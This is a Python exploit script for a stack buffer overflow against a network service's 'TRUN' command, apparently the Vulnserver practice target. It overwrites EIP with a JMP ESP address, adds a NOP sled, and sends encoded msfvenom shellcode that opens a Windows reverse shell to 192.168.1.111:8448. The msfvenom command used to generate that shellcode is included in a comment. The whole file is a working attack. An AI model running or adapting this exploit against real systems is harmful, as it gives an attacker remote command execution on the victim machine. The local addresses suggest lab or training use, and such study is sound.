import socket
import sys
import struct

# how to execute:
# python overflow.py 192.168.1.109 9999

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 2003)

#!mona jmp -r esp -b "\x00"
eip = 0x625011AF
eip = struct.pack("<I", eip)  # convert to little endian address (reverse order)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8448 -f c -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai
payload = ("\xbb\xb5\x43\xda\x4b\xda\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
           "\x52\x83\xc7\x04\x31\x5f\x0e\x03\xea\x4d\x38\xbe\xe8\xba\x3e"
           "\x41\x10\x3b\x5f\xcb\xf5\x0a\x5f\xaf\x7e\x3c\x6f\xbb\xd2\xb1"
           "\x04\xe9\xc6\x42\x68\x26\xe9\xe3\xc7\x10\xc4\xf4\x74\x60\x47"
           "\x77\x87\xb5\xa7\x46\x48\xc8\xa6\x8f\xb5\x21\xfa\x58\xb1\x94"
           "\xea\xed\x8f\x24\x81\xbe\x1e\x2d\x76\x76\x20\x1c\x29\x0c\x7b"
           "\xbe\xc8\xc1\xf7\xf7\xd2\x06\x3d\x41\x69\xfc\xc9\x50\xbb\xcc"
           "\x32\xfe\x82\xe0\xc0\xfe\xc3\xc7\x3a\x75\x3d\x34\xc6\x8e\xfa"
           "\x46\x1c\x1a\x18\xe0\xd7\xbc\xc4\x10\x3b\x5a\x8f\x1f\xf0\x28"
           "\xd7\x03\x07\xfc\x6c\x3f\x8c\x03\xa2\xc9\xd6\x27\x66\x91\x8d"
           "\x46\x3f\x7f\x63\x76\x5f\x20\xdc\xd2\x14\xcd\x09\x6f\x77\x9a"
           "\xfe\x42\x87\x5a\x69\xd4\xf4\x68\x36\x4e\x92\xc0\xbf\x48\x65"
           "\x26\xea\x2d\xf9\xd9\x15\x4e\xd0\x1d\x41\x1e\x4a\xb7\xea\xf5"
           "\x8a\x38\x3f\x59\xda\x96\x90\x1a\x8a\x56\x41\xf3\xc0\x58\xbe"
           "\xe3\xeb\xb2\xd7\x8e\x16\x55\x18\xe6\x19\xca\xf0\xf5\x19\x35"
           "\x01\x73\xff\x5f\x11\xd5\xa8\xf7\x88\x7c\x22\x69\x54\xab\x4f"
           "\xa9\xde\x58\xb0\x64\x17\x14\xa2\x11\xd7\x63\x98\xb4\xe8\x59"
           "\xb4\x5b\x7a\x06\x44\x15\x67\x91\x13\x72\x59\xe8\xf1\x6e\xc0"
           "\x42\xe7\x72\x94\xad\xa3\xa8\x65\x33\x2a\x3c\xd1\x17\x3c\xf8"
           "\xda\x13\x68\x54\x8d\xcd\xc6\x12\x67\xbc\xb0\xcc\xd4\x16\x54"
           "\x88\x16\xa9\x22\x95\x72\x5f\xca\x24\x2b\x26\xf5\x89\xbb\xae"
           "\x8e\xf7\x5b\x50\x45\xbc\x6c\x1b\xc7\x95\xe4\xc2\x92\xa7\x68"
           "\xf5\x49\xeb\x94\x76\x7b\x94\x62\x66\x0e\x91\x2f\x20\xe3\xeb"
           "\x20\xc5\x03\x5f\x40\xcc")

exploit = junk + eip + ("\x90" * 16) + payload

# sending exploit
while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    print("Sending exploit...")
    s.send("TRUN /.:/" + exploit + "\n")
    s.recv(1024)
    s.close()
  except:
    sys.exit(0)